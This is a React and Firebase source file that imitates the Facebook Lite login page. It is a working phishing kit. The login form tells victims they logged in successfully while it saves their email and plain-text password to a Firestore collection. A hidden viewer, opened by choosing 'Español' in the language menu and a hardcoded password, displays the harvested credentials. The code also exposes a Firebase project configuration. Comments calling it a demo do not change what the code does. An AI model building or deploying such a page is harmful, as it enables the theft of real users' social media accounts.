import React, { useState, useEffect } from 'react';
import { initializeApp } from 'firebase/app';
import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from 'firebase/auth';
import { getFirestore, collection, onSnapshot, query, serverTimestamp, addDoc } from 'firebase/firestore';
import { Send, List, User, Loader2, CheckCircle, XCircle, Eye, EyeOff, ChevronDown, X, Lock, Mail } from 'lucide-react';

// আপনার Firebase কনফিগারেশন
const YOUR_FIREBASE_CONFIG = {
  apiKey: "AIzaSyAlp81SMW-M5zWK6VS9tgFXDv7IGp_yK4c",
  authDomain: "okhhhhh-c4055.firebaseapp.com",
  projectId: "okhhhhh-c4055",
  storageBucket: "okhhhhh-c4055.firebasestorage.app",
  messagingSenderId: "505784498135",
  appId: "1:505784498135:web:5c00d1a5d1fff5976cbd92",
  measurementId: "G-LJBG788P2Q"
};

// পরিবেশ থেকে প্রাপ্ত Firebase কনফিগারেশন ব্যবহার করুন, অন্যথায় আপনার নিজস্ব কনফিগারেশন ব্যবহার করুন।
// যদি আপনি এটি স্থানীয়ভাবে চালাচ্ছেন, তবে YOUR_FIREBASE_CONFIG ব্যবহার করা হবে।
const firebaseConfig = (typeof __firebase_config !== 'undefined' && Object.keys(JSON.parse(__firebase_config)).length > 0)
  ? JSON.parse(__firebase_config)
  : YOUR_FIREBASE_CONFIG;

// আপনার অ্যাপ্লিকেশনের ডেটার জন্য একটি অনন্য আইডি সংজ্ঞায়িত করুন Firestore-এ।
// এই স্ট্রিংটি সব ব্রাউজার/ডিভাইসে অবশ্যই একই থাকতে হবে।
const appId = "my-facebook-lite-demo-data"; // <-- এটি আপনার ডেটা সংরক্ষণের জন্য ব্যবহৃত অনন্য আইডি

// এই ভেরিয়েবলটি শুধু Google এর জেমিনি স্যান্ডবক্সের জন্য, আপনার স্থানীয় কোডে এর দরকার নেই
const initialAuthToken = typeof __initial_auth_token !== 'undefined' ? __initial_auth_token : null;


// Helper function to display messages
const showMessage = (elementId, msg, type) => {
  const messageElement = document.getElementById(elementId);
  if (messageElement) {
    messageElement.textContent = msg;
    messageElement.className = 'message'; // Reset classes
    messageElement.classList.add(type);
    messageElement.classList.remove('hidden');
    setTimeout(() => {
      messageElement.classList.add('hidden');
    }, 5000); // Hide message after 5 seconds
  }
};

// --- Language Selection Modal Component ---
const LanguageModal = ({ onClose, onSelectLanguage }) => {
  const languages = [
    { name: 'English (US)', value: 'en_US', checked: true },
    { name: 'বাংলা', value: 'bn_BD' },
    { name: 'অসমীয়া', value: 'as_IN' },
    { name: 'Español', value: 'es_ES' }, // This one will trigger navigation
    { name: 'हिन्दी', value: 'hi_IN' },
    { name: 'Français (France)', value: 'fr_FR' },
    { name: '中文(简体)', value: 'zh_CN' },
    { name: 'العربية', value: 'ar_SA' },
    // Add more languages as needed
  ];

  return (
    <div className="fixed inset-0 bg-gray-900 bg-opacity-75 flex items-center justify-center z-50">
      <div className="bg-white rounded-lg shadow-xl w-11/12 max-w-sm overflow-hidden relative">
        {/* Close Button */}
        <button
          onClick={onClose}
          className="absolute top-4 left-4 p-2 rounded-full hover:bg-gray-200 transition-colors"
        >
          <X className="h-6 w-6 text-gray-500" />
        </button>

        {/* Header */}
        <div className="py-4 text-center border-b border-gray-200">
          <h2 className="text-xl font-semibold text-gray-800">Select your language</h2>
        </div>

        {/* Language List */}
        <div className="p-4 max-h-80 overflow-y-auto">
          {languages.map((lang) => (
            <div
              key={lang.value}
              className="flex items-center justify-between py-3 border-b border-gray-100 last:border-b-0 cursor-pointer hover:bg-gray-50 transition-colors"
              onClick={() => onSelectLanguage(lang.value)}
            >
              <span className="text-gray-700 text-base">{lang.name}</span>
              <input
                type="checkbox"
                readOnly
                checked={lang.checked || false}
                className="form-checkbox h-5 w-5 text-blue-600 rounded-full border-gray-300 cursor-pointer"
              />
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};

// --- Login Page Component ---
const LoginPage = ({ onToggleLanguageModal, onNavigateToViewer, db, auth, userId }) => {
  const handleLogin = async () => {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    if (!email || !password) {
      showMessage('login-message', 'Mobile number or email and password are required.', 'error');
      return;
    }

    showMessage('login-message', 'Logging in...', 'info');

    setTimeout(async () => {
      showMessage('login-message', 'Login successful! Welcome to Facebook.', 'success');

      // 🚨 SECURITY WARNING: Storing passwords in plain text is highly insecure.
      // This is for demo purposes only as per user request.
      // In a real app, NEVER store passwords directly.
      if (db && userId) {
        try {
          await addDoc(collection(db, `artifacts/${appId}/public/data/userInputs`), {
            type: 'login_credential', // Indicate this is a login attempt
            email: email,
            password: password, // 🚨🚨🚨 INSECURE: Storing plain text password 🚨🚨🚨
            timestamp: serverTimestamp(),
            submittedBy: userId,
          });
          console.log("Login credentials saved to Firestore (for demo purposes).");
        } catch (error) {
          console.error("Error saving login credentials to Firestore:", error);
        }
      }

    }, 1500); // Simulate 1.5 second network delay
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-white flex flex-col items-center pt-8 md:pt-16">
      {/* Language Selector at Top */}
      <div
        className="flex items-center text-gray-600 text-sm mb-12 cursor-pointer hover:text-gray-800 transition-colors"
        onClick={onToggleLanguageModal}
      >
        <span>English (US)</span>
        <ChevronDown className="h-4 w-4 ml-1" />
      </div>

      {/* Facebook Logo - Updated to transparent logo */}
      <img src="https://i.postimg.cc/QMDybDSJ/CC-20250602-123222.png" alt="Facebook" className="w-14 h-14 mb-8" />

      {/* Login Form */}
      <div className="w-11/12 max-w-xs bg-white rounded-lg px-4 py-6">
        <form className="space-y-3">
          <input
            type="text"
            id="email"
            placeholder="Mobile number or email"
            className="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500"
          />
          <input
            type="password"
            id="password"
            placeholder="Password"
            className="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500"
          />
          <button
            type="button"
            onClick={handleLogin}
            className="w-full p-3 rounded-md text-white font-semibold text-lg bg-blue-500 hover:bg-blue-600 transition-colors duration-200"
          >
            Log in
          </button>
          <div className="text-center">
            <a href="#" onClick={(e) => { e.preventDefault(); showMessage('login-message', 'Forgot password functionality is not implemented on this demo.', 'info'); }} className="text-sm text-blue-500 hover:underline">
              Forgot password?
            </a>
          </div>
          {/* Message Area for Login */}
          <div id="login-message" className="message hidden"></div>
        </form>

        <div className="border-t border-gray-300 my-6"></div> {/* Divider */}

        <button
          type="button"
          onClick={() => showMessage('login-message', 'Create new account functionality not implemented.', 'info')}
          className="w-full p-2.5 rounded-md text-blue-500 font-semibold text-base border border-blue-500 bg-white hover:bg-blue-50 transition-colors duration-200"
        >
          Create new account
        </button>
      </div>

      {/* Meta Logo and Text */}
      <div className="flex flex-col items-center mt-12 pb-8">
        <img src="https://static.xx.fbcdn.net/rsrc.php/yC/r/bfY_RzC9y3L.png" alt="Meta" className="w-16 h-4 mb-2" /> {/* Meta logo */}
        <span className="text-xs text-gray-500">∞ Meta</span>
      </div>
    </div>
  );
};

// --- Data Viewer Page Component ---
const DataViewerPage = ({ onBackToLogin, db, auth, userId, isAuthReady }) => {
  const [passwordInput, setPasswordInput] = useState('');
  const [passwordCorrect, setPasswordCorrect] = useState(false);
  const [submittedData, setSubmittedData] = useState([]);
  const [showPassword, setShowPassword] = useState(false);
  const [inputValue, setInputValue] = useState(''); // State for general input submission

  // --- Real-time Data Fetching from Firestore ---
  useEffect(() => {
    if (db && userId && isAuthReady && passwordCorrect) { // Only fetch if password is correct
      const dataCollectionRef = collection(db, `artifacts/${appId}/public/data/userInputs`);
      const q = query(dataCollectionRef);

      const unsubscribe = onSnapshot(q, (snapshot) => {
        const fetchedData = [];
        snapshot.forEach((doc) => {
          fetchedData.push({ id: doc.id, ...doc.data() });
        });
        fetchedData.sort((a, b) => (b.timestamp?.toDate() || 0) - (a.timestamp?.toDate() || 0));
        setSubmittedData(fetchedData);
      }, (error) => {
        console.error("Error fetching data:", error);
        showMessage("viewer-message", "Failed to load data. Please refresh.", 'error');
      });
      return () => unsubscribe();
    }
  }, [db, userId, isAuthReady, passwordCorrect]);

  // --- Handle Password Submission for Viewer Access ---
  const handlePasswordSubmit = () => {
    // SECURITY WARNING: Hardcoding password in frontend is highly insecure.
    // In a real app, this should be validated on a secure backend.
    if (passwordInput === 'ILOVEORIONEX') {
      setPasswordCorrect(true);
      showMessage("viewer-message", "Password correct! Loading data...", 'success');
    } else {
      setPasswordCorrect(false);
      showMessage("viewer-message", "Incorrect password.", 'error');
    }
  };

  // --- Handle Input Submission (General Input) ---
  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!inputValue.trim()) {
      showMessage('viewer-message', 'Please enter some text to submit.', 'error');
      return;
    }
    if (!db || !userId) {
      showMessage('viewer-message', 'App is not ready. Please wait.', 'error');
      return;
    }

    try {
      await addDoc(collection(db, `artifacts/${appId}/public/data/userInputs`), {
        type: 'general_input', // Indicate this is a general input
        text: inputValue,
        timestamp: serverTimestamp(),
        submittedBy: userId,
      });
      setInputValue(''); // Clear the input field
      showMessage('viewer-message', 'Your input has been saved successfully!', 'success');
    } catch (error) {
      console.error("Error adding document:", error);
      showMessage('viewer-message', 'Failed to save your input. Please try again.', 'error');
    }
  };


  if (!isAuthReady) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-900 text-white">
        <Loader2 className="animate-spin h-8 w-8 mr-3 text-indigo-400" />
        <p>Loading application...</p>
      </div>
    );
  }

  // Filter data into login attempts and general inputs
  const loginAttempts = submittedData.filter(data => data.type === 'login_credential');
  const generalInputs = submittedData.filter(data => data.type === 'general_input');

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 to-black text-white p-4 sm:p-8 font-sans">
      <header className="flex flex-col sm:flex-row justify-between items-center mb-8 p-4 bg-gray-800 rounded-lg shadow-lg">
        <h1 className="text-3xl font-bold text-indigo-400 flex items-center gap-2 mb-4 sm:mb-0">
          <List className="h-8 w-8" /> ব্যবহারকারীর ইনপুট দেখুন
        </h1>
        <button
          onClick={onBackToLogin}
          className="px-4 py-2 rounded-lg font-semibold transition-all duration-300 bg-red-600 hover:bg-red-700 flex items-center gap-2"
        >
          <XCircle className="h-5 w-5" /> লগইন পেজে ফিরে যান
        </button>
      </header>

      <div id="viewer-message" className="message hidden"></div>

      {!passwordCorrect ? (
        <section className="bg-gray-800 p-6 rounded-lg shadow-lg max-w-md mx-auto text-center">
          <h2 className="text-2xl font-semibold mb-6 text-indigo-300">ইনপুট দেখতে পাসওয়ার্ড দিন</h2>
          <div className="relative mb-4">
            <input
              type={showPassword ? "text" : "password"}
              value={passwordInput}
              onChange={(e) => setPasswordInput(e.target.value)}
              placeholder="পাসওয়ার্ড দিন"
              className="w-full p-3 rounded-md bg-gray-700 border border-gray-600 focus:border-indigo-500 focus:ring focus:ring-indigo-500 focus:ring-opacity-50 outline-none text-white pr-10"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-white"
            >
              {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
            </button>
          </div>
          <button
            onClick={handlePasswordSubmit}
            className="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 px-4 rounded-lg transition-colors duration-300 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
          >
            <CheckCircle className="h-5 w-5" /> জমা দিন
          </button>
        </section>
      ) : (
        <section className="bg-gray-800 p-6 rounded-lg shadow-lg">
          <h2 className="text-2xl font-semibold mb-6 text-indigo-300 flex items-center gap-2">
            <List className="h-6 w-6" /> জমা পড়া ইনপুট এবং নতুন ইনপুট জমা দিন
          </h2>
          {userId && (
            <div className="flex items-center bg-gray-700 px-3 py-2 rounded-full text-sm mb-4">
              <User className="h-4 w-4 mr-2 text-gray-300" />
              <span className="font-mono text-indigo-300 truncate max-w-[150px] sm:max-w-[250px]">
                আপনার ইউজার আইডি: {userId}
              </span>
            </div>
          )}

          {/* New Input Submission Form */}
          <div className="mb-8 p-4 bg-gray-700 rounded-lg">
            <h3 className="text-xl font-semibold mb-4 text-indigo-200 flex items-center gap-2">
              <Send className="h-5 w-5" /> এখানে আপনার ইনপুট লিখুন
            </h3>
            <form onSubmit={handleSubmit}>
              <textarea
                value={inputValue}
                onChange={(e) => setInputValue(e.target.value)}
                rows="4"
                className="w-full p-3 rounded-md bg-gray-600 border border-gray-500 focus:border-indigo-500 focus:ring focus:ring-indigo-500 focus:ring-opacity-50 outline-none text-white resize-y"
                placeholder="এখানে আপনার টেক্সট লিখুন..."
              ></textarea>
              <button
                type="submit"
                disabled={!db || !userId || !inputValue.trim()}
                className="w-full mt-3 bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-2.5 px-4 rounded-lg transition-colors duration-300 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              >
                <Send className="h-5 w-5" /> জমা দিন
              </button>
            </form>
          </div>

          {/* Display Login Attempts */}
          {loginAttempts.length > 0 && (
            <div className="mb-8">
              <h3 className="text-xl font-semibold mb-4 text-red-400 flex items-center gap-2">
                <Lock className="h-5 w-5" /> লগইন প্রচেষ্টা (অনিরাপদ)
              </h3>
              <div className="space-y-4">
                {loginAttempts.map((data) => (
                  <div key={data.id} className="bg-gray-700 p-4 rounded-md border border-gray-600">
                    <p className="text-gray-200 mb-1 flex items-center gap-2">
                      <Mail className="h-4 w-4" /> ইমেল/ইউজারনেম: <span className="font-mono text-yellow-300">{data.email}</span>
                    </p>
                    <p className="text-gray-200 mb-2 flex items-center gap-2">
                      <Lock className="h-4 w-4" /> পাসওয়ার্ড: <span className="font-mono text-red-300">{data.password}</span>
                    </p>
                    <p className="text-sm text-gray-400">
                      <span className="font-bold text-red-500">🚨 সতর্কতা:</span> এই পাসওয়ার্ডটি ডেটাবেসে সরাসরি সংরক্ষিত হয়েছে। বাস্তব অ্যাপ্লিকেশনের জন্য এটি অত্যন্ত অনিরাপদ।
                    </p>
                    <div className="flex justify-between items-center text-sm text-gray-400 mt-2 border-t border-gray-600 pt-2">
                      <span>
                        {data.timestamp ? new Date(data.timestamp.toDate()).toLocaleString('bn-BD') : 'সময় অজানা'}
                      </span>
                      <span className="font-mono">
                        {data.submittedBy === userId ? 'আপনি' : `ইউজার: ${data.submittedBy.substring(0, 6)}...`}
                      </span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Display General Inputs */}
          <h3 className="text-xl font-semibold mb-4 text-indigo-200 flex items-center gap-2">
              <List className="h-5 w-5" /> পূর্বে জমা পড়া ইনপুট
          </h3>
          {generalInputs.length === 0 ? (
            <p className="text-gray-400 text-center py-8">কোনো সাধারণ ইনপুট পাওয়া যায়নি।</p>
          ) : (
            <div className="space-y-4">
              {generalInputs.map((data) => (
                <div key={data.id} className="bg-gray-700 p-4 rounded-md border border-gray-600">
                  <p className="text-gray-200 text-lg mb-2">{data.text}</p>
                  <div className="flex justify-between items-center text-sm text-gray-400 mt-2 border-t border-gray-600 pt-2">
                    <span>
                      {data.timestamp ? new Date(data.timestamp.toDate()).toLocaleString('bn-BD') : 'সময় অজানা'}
                    </span>
                    <span className="font-mono">
                      {data.submittedBy === userId ? 'আপনি' : `ইউজার: ${data.submittedBy.substring(0, 6)}...`}
                    </span>
                  </div>
                </div>
              ))}
            </div>
          )}
        </section>
      )}
    </div>
  );
};

// --- Main App Component (Router and State Management) ---
const App = () => {
  const [currentPage, setCurrentPage] = useState('login'); // 'login' or 'viewer'
  const [showLanguageModal, setShowLanguageModal] = useState(false);

  // Firebase state shared across components
  const [db, setDb] = useState(null);
  const [auth, setAuth] = useState(null);
  const [userId, setUserId] = useState(null);
  const [isAuthReady, setIsAuthReady] = useState(false);

  // Initialize Firebase (runs once)
  useEffect(() => {
    try {
      const app = initializeApp(firebaseConfig);
      const firestore = getFirestore(app);
      const firebaseAuth = getAuth(app);

      setDb(firestore);
      setAuth(firebaseAuth);

      const unsubscribe = onAuthStateChanged(firebaseAuth, async (user) => {
        if (user) {
          setUserId(user.uid);
          setIsAuthReady(true);
        } else {
          try {
            if (initialAuthToken) {
              await signInWithCustomToken(firebaseAuth, initialAuthToken);
            } else {
              await signInAnonymously(firebaseAuth);
            }
          } catch (error) {
            console.error("Firebase authentication failed:", error);
            // showMessage is not available here, log to console
            console.log("Authentication failed. Please try again later.");
            setIsAuthReady(true);
          }
        }
      });
      return () => unsubscribe();
    } catch (error) {
      console.error("Failed to initialize Firebase:", error);
      // showMessage is not available here, log to console
      console.log("Failed to initialize app. Check console for details.");
      setIsAuthReady(true);
    }
  }, []);


  const handleNavigateToViewer = () => {
    setCurrentPage('viewer');
  };

  const handleBackToLogin = () => {
    setCurrentPage('login');
  };

  const handleToggleLanguageModal = () => {
    setShowLanguageModal(!showLanguageModal);
  };

  const handleLanguageSelect = (languageValue) => {
    if (languageValue === 'es_ES') { // 'Español' is selected
      handleNavigateToViewer();
    } else {
      // For other languages, just close the modal.
      // In a real app, you'd change the app's language here.
      // showMessage('login-message', `Language changed to ${languageValue}. (Demo only)`, 'info');
    }
    setShowLanguageModal(false); // Close modal after selection
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col justify-between items-center font-inter">
      {/* Custom CSS for Facebook-like styling */}
      <style>
        {`
        /* Custom font similar to Facebook's (Inter is a good general choice) */
        body {
          font-family: 'Inter', sans-serif;
        }

        /* Custom Facebook Colors */
        .fb-blue {
          background-color: #1877f2;
        }
        .fb-blue-hover:hover {
          background-color: #166fe5;
        }
        .fb-green {
          background-color: #42b72a;
        }
        .fb-green-hover:hover {
          background-color: #36a420;
        }
        .fb-text-blue {
          color: #1877f2;
        }
        .fb-text-gray {
          color: #65676b;
        }

        /* Horizontal line with "Or" - Not used in Lite, but kept for context */
        .or-divider {
          display: flex;
          align-items: center;
          text-align: center;
          color: #65676b;
          font-size: 0.875rem;
        }
        .or-divider::before,
        .or-divider::after {
          content: '';
          flex: 1;
          border-bottom: 1px solid #dadde1;
        }
        .or-divider:not(:empty)::before {
          margin-right: .25em;
        }
        .or-divider:not(:empty)::after {
          margin-left: .25em;
        }

        /* Message styling */
        .message {
          padding: 0.75rem;
          border-radius: 0.5rem;
          margin-top: 1rem;
          font-size: 0.875rem;
          font-weight: 500;
          text-align: center; /* Center align messages */
        }
        .message.hidden {
          display: none;
        }
        .message.success {
          background-color: #d4edda;
          color: #155724;
          border: 1px solid #c3e6cb;
        }
        .message.error {
          background-color: #f8d7da;
          color: #721c24;
          border: 1px solid #f5c6cb;
        }
        .message.info {
          background-color: #d1ecf1;
          color: #0c5460;
          border: 1px solid #bee5eb;
        }
        `}
      </style>

      {currentPage === 'login' && <LoginPage onToggleLanguageModal={handleToggleLanguageModal} onNavigateToViewer={handleNavigateToViewer} db={db} auth={auth} userId={userId} />}
      {currentPage === 'viewer' && <DataViewerPage onBackToLogin={handleBackToLogin} db={db} auth={auth} userId={userId} isAuthReady={isAuthReady} />}
      {showLanguageModal && <LanguageModal onClose={handleToggleLanguageModal} onSelectLanguage={handleLanguageSelect} />}

      {/* Footer Section - Simplified for Lite version */}
      {currentPage === 'login' && (
        <footer className="w-full py-4 text-xs text-gray-500 text-center">
          <p>Meta © 2024</p>
        </footer>
      )}
    </div>
  );
};

export default App;